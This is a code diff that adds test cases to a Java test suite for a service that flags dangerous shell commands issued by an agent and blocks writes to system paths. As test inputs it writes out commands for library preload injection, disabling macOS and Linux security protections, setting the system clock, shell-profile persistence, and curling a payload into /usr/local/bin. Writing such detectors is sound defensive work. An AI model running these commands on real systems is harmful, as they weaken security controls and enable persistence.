@@ -513,6 +513,15 @@ public class DangerousCommandApprovalServiceTest {
         DangerousCommandApprovalService.DetectionResult setcap =
                 env.dangerousCommandApprovalService.detect(
                         "execute_shell", "setcap cap_net_bind_service+ep ./server");
+        DangerousCommandApprovalService.DetectionResult ldPreload =
+                env.dangerousCommandApprovalService.detect(
+                        "execute_shell", "LD_PRELOAD=./hook.so ./server");
+        DangerousCommandApprovalService.DetectionResult dyldPreload =
+                env.dangerousCommandApprovalService.detect(
+                        "execute_shell", "DYLD_INSERT_LIBRARIES=./hook.dylib ./app");
+        DangerousCommandApprovalService.DetectionResult ldSoPreloadWrite =
+                env.dangerousCommandApprovalService.detect(
+                        "execute_shell", "echo /tmp/hook.so | tee /etc/ld.so.preload");
         DangerousCommandApprovalService.DetectionResult ufwDisable =
                 env.dangerousCommandApprovalService.detect("execute_shell", "ufw disable");
         DangerousCommandApprovalService.DetectionResult iptablesFlush =
@@ -525,6 +534,18 @@ public class DangerousCommandApprovalServiceTest {
         DangerousCommandApprovalService.DetectionResult stopAppArmor =
                 env.dangerousCommandApprovalService.detect(
                         "execute_shell", "systemctl disable apparmor");
+        DangerousCommandApprovalService.DetectionResult spctlDisable =
+                env.dangerousCommandApprovalService.detect(
+                        "execute_shell", "spctl --master-disable");
+        DangerousCommandApprovalService.DetectionResult quarantineRemove =
+                env.dangerousCommandApprovalService.detect(
+                        "execute_shell", "xattr -d com.apple.quarantine ./payload");
+        DangerousCommandApprovalService.DetectionResult tccReset =
+                env.dangerousCommandApprovalService.detect(
+                        "execute_shell", "tccutil reset All");
+        DangerousCommandApprovalService.DetectionResult csrDisable =
+                env.dangerousCommandApprovalService.detect(
+                        "execute_shell", "csrutil disable");
 
         assertThat(recursiveLong).isNotNull();
         assertThat(recursiveLong.getPatternKey()).isEqualTo("recursive_delete_long_flag");
@@ -550,6 +571,12 @@ public class DangerousCommandApprovalServiceTest {
         assertThat(chmodNumericSetuid.getPatternKey()).isEqualTo("chmod_setuid_setgid");
         assertThat(setcap).isNotNull();
         assertThat(setcap.getPatternKey()).isEqualTo("setcap_privilege");
+        assertThat(ldPreload).isNotNull();
+        assertThat(ldPreload.getPatternKey()).isEqualTo("dynamic_library_preload_injection");
+        assertThat(dyldPreload).isNotNull();
+        assertThat(dyldPreload.getPatternKey()).isEqualTo("dynamic_library_preload_injection");
+        assertThat(ldSoPreloadWrite).isNotNull();
+        assertThat(ldSoPreloadWrite.getPatternKey()).isEqualTo("dynamic_library_preload_injection");
         assertThat(ufwDisable).isNotNull();
         assertThat(ufwDisable.getPatternKey()).isEqualTo("linux_disable_firewall");
         assertThat(iptablesFlush).isNotNull();
@@ -560,6 +587,14 @@ public class DangerousCommandApprovalServiceTest {
         assertThat(setenforce.getPatternKey()).isEqualTo("linux_disable_mac_policy");
         assertThat(stopAppArmor).isNotNull();
         assertThat(stopAppArmor.getPatternKey()).isEqualTo("linux_disable_mac_policy");
+        assertThat(spctlDisable).isNotNull();
+        assertThat(spctlDisable.getPatternKey()).isEqualTo("macos_security_policy_weaken");
+        assertThat(quarantineRemove).isNotNull();
+        assertThat(quarantineRemove.getPatternKey()).isEqualTo("macos_security_policy_weaken");
+        assertThat(tccReset).isNotNull();
+        assertThat(tccReset.getPatternKey()).isEqualTo("macos_security_policy_weaken");
+        assertThat(csrDisable).isNotNull();
+        assertThat(csrDisable.getPatternKey()).isEqualTo("macos_security_policy_weaken");
     }
 
     @Test
@@ -632,6 +667,17 @@ public class DangerousCommandApprovalServiceTest {
         DangerousCommandApprovalService.DetectionResult macAdmin =
                 env.dangerousCommandApprovalService.detect(
                         "execute_shell", "dscl . -append /Groups/admin GroupMembership deploy");
+        DangerousCommandApprovalService.DetectionResult timedateSet =
+                env.dangerousCommandApprovalService.detect(
+                        "execute_shell", "timedatectl set-time '2026-01-01 00:00:00'");
+        DangerousCommandApprovalService.DetectionResult dateSet =
+                env.dangerousCommandApprovalService.detect(
+                        "execute_shell", "date -s '2026-01-01 00:00:00'");
+        DangerousCommandApprovalService.DetectionResult powershellSetDate =
+                env.dangerousCommandApprovalService.detect(
+                        "execute_shell", "Set-Date -Date '2026-01-01'");
+        DangerousCommandApprovalService.DetectionResult dateRead =
+                env.dangerousCommandApprovalService.detect("execute_shell", "date");
         DangerousCommandApprovalService.DetectionResult killallGateway =
                 env.dangerousCommandApprovalService.detect("execute_shell", "killall gateway");
         DangerousCommandApprovalService.DetectionResult pkillUnrelated =
@@ -779,6 +825,13 @@ public class DangerousCommandApprovalServiceTest {
         assertThat(windowsAdmin.getPatternKey()).isEqualTo("local_admin_permission_change");
         assertThat(macAdmin).isNotNull();
         assertThat(macAdmin.getPatternKey()).isEqualTo("local_admin_permission_change");
+        assertThat(timedateSet).isNotNull();
+        assertThat(timedateSet.getPatternKey()).isEqualTo("system_time_tamper");
+        assertThat(dateSet).isNotNull();
+        assertThat(dateSet.getPatternKey()).isEqualTo("system_time_tamper");
+        assertThat(powershellSetDate).isNotNull();
+        assertThat(powershellSetDate.getPatternKey()).isEqualTo("system_time_tamper");
+        assertThat(dateRead).isNull();
         assertThat(killallGateway).isNotNull();
         assertThat(killallGateway.getPatternKey()).isEqualTo("kill_agent_process");
         assertThat(pkillUnrelated).isNull();
@@ -1849,6 +1902,18 @@ public class DangerousCommandApprovalServiceTest {
         DangerousCommandApprovalService.DetectionResult shellRc =
                 env.dangerousCommandApprovalService.detect(
                         "execute_shell", "printf 'x' | tee ~/.bashrc");
+        DangerousCommandApprovalService.DetectionResult shellProfileRedirect =
+                env.dangerousCommandApprovalService.detect(
+                        "execute_shell", "echo 'PROMPT_COMMAND=whoami' >> ~/.profile");
+        DangerousCommandApprovalService.DetectionResult shellProfileTeeAppend =
+                env.dangerousCommandApprovalService.detect(
+                        "execute_shell", "printf 'BASH_ENV=/tmp/hook' | tee -a $HOME/.bashrc");
+        DangerousCommandApprovalService.DetectionResult shellProfilePowerShell =
+                env.dangerousCommandApprovalService.detect(
+                        "execute_shell", "Add-Content $env:HOME/.zshrc 'alias sudo=sudo -E'");
+        DangerousCommandApprovalService.DetectionResult projectProfileWrite =
+                env.dangerousCommandApprovalService.detect(
+                        "execute_shell", "echo local > fixtures/.bashrc");
         DangerousCommandApprovalService.DetectionResult envHomeSshWrite =
                 env.dangerousCommandApprovalService.detect(
                         "execute_shell", "cat key >> $env:HOME/.ssh/authorized_keys");
@@ -1916,7 +1981,17 @@ public class DangerousCommandApprovalServiceTest {
         assertThat(sshWrite).isNotNull();
         assertThat(sshWrite.getPatternKey()).isEqualTo("sensitive_redirection");
         assertThat(shellRc).isNotNull();
-        assertThat(shellRc.getPatternKey()).isEqualTo("sensitive_tee");
+        assertThat(shellRc.getPatternKey()).isEqualTo("shell_profile_persistence_injection");
+        assertThat(shellProfileRedirect).isNotNull();
+        assertThat(shellProfileRedirect.getPatternKey())
+                .isEqualTo("shell_profile_persistence_injection");
+        assertThat(shellProfileTeeAppend).isNotNull();
+        assertThat(shellProfileTeeAppend.getPatternKey())
+                .isEqualTo("shell_profile_persistence_injection");
+        assertThat(shellProfilePowerShell).isNotNull();
+        assertThat(shellProfilePowerShell.getPatternKey())
+                .isEqualTo("shell_profile_persistence_injection");
+        assertThat(projectProfileWrite).isNull();
         assertThat(envHomeSshWrite).isNotNull();
         assertThat(envHomeSshWrite.getPatternKey()).isEqualTo("sensitive_redirection");
         assertThat(envUserProfileSshWrite).isNotNull();
@@ -3759,6 +3834,10 @@ public class DangerousCommandApprovalServiceTest {
         assertWriteDenied(securityPolicyService, "/etc/sudoers.d/custom");
         assertWriteDenied(securityPolicyService, "/etc/systemd/system/evil.service");
         assertWriteDenied(securityPolicyService, "/boot/grub/grub.cfg");
+        assertWriteDenied(securityPolicyService, "/bin/payload");
+        assertWriteDenied(securityPolicyService, "/usr/bin/payload");
+        assertWriteDenied(securityPolicyService, "/usr/local/bin/payload");
+        assertWriteDenied(securityPolicyService, "/usr/local/sbin/payload");
         assertWriteDenied(securityPolicyService, "/usr/lib/systemd/system/evil.service");
         assertWriteDenied(securityPolicyService, "/private/etc/hosts");
         assertWriteDenied(securityPolicyService, "/private/var/root-owned");
@@ -4298,6 +4377,12 @@ public class DangerousCommandApprovalServiceTest {
                         "Set-Content $env:HOME/.bash_profile bad");
         SecurityPolicyService.FileVerdict systemd =
                 securityPolicyService.checkCommandPaths("cat service > /etc/systemd/system/evil.service");
+        SecurityPolicyService.FileVerdict localBin =
+                securityPolicyService.checkCommandPaths(
+                        "curl https://example.invalid/payload -o /usr/local/bin/payload");
+        SecurityPolicyService.FileVerdict localDownload =
+                securityPolicyService.checkCommandPaths(
+                        "curl https://example.invalid/payload -o payload");
 
         assertThat(shadow.isAllowed()).isFalse();
         assertThat(shadow.getMessage()).contains("系统文件");
@@ -4305,6 +4390,9 @@ public class DangerousCommandApprovalServiceTest {
         assertThat(envHomeProfile.isAllowed()).isFalse();
         assertThat(envHomeProfile.getPath()).isEqualTo("$env:HOME/.bash_profile");
         assertThat(systemd.isAllowed()).isFalse();
+        assertThat(localBin.isAllowed()).isFalse();
+        assertThat(localBin.getPath()).isEqualTo("/usr/local/bin/payload");
+        assertThat(localDownload.isAllowed()).isTrue();
     }
 
     @Test
